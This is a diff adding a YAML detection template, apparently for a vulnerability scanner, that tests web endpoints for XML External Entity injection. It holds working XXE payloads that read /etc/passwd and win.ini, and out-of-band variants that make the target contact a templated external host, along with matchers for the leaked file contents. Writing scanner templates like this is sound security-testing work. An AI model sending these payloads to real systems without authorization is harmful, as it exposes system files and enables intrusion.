@@ -1,0 +1,58 @@
+id: xxe
+info:
+  name: "XML External Entity Injection"
+  severity: high
+  description: "Detects XXE by sending XML payloads with external entity declarations"
+  tags: [xxe, injection, xml]
+  author: Wired
+
+inject: body
+detection: pattern
+
+payloads:
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root><data>&xxe;</data></root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+    ]>
+    <root><data>&xxe;</data></root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "{{OOB_URL}}">
+    ]>
+    <root><data>&xxe;</data></root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "{{OOB_URL}}">
+      %xxe;
+    ]>
+    <root><data>test</data></root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe-test">
+    ]>
+    <root><data>&xxe;</data></root>
+
+matchers:
+  body_patterns:
+    - "root:.*:0:0:"
+    - "daemon:.*:/usr/sbin"
+    - "\\[fonts\\]"
+    - "\\[extensions\\]"
+
+oob_payloads:
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "{{OOB_URL}}">
+    ]>
+    <root>&xxe;</root>
